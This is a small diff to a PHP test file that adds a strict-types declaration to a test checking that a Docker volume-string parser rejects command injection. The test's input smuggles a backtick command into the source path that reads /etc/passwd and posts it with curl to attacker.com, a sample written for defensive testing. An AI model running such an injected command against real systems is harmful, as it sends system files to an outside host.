@@ -1,5 +1,7 @@
 <?php
 
+declare(strict_types=1);
+
 test('parseDockerVolumeString rejects command injection in source path', function () {
     $maliciousVolume = '/tmp/pwn`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`:/app';
 
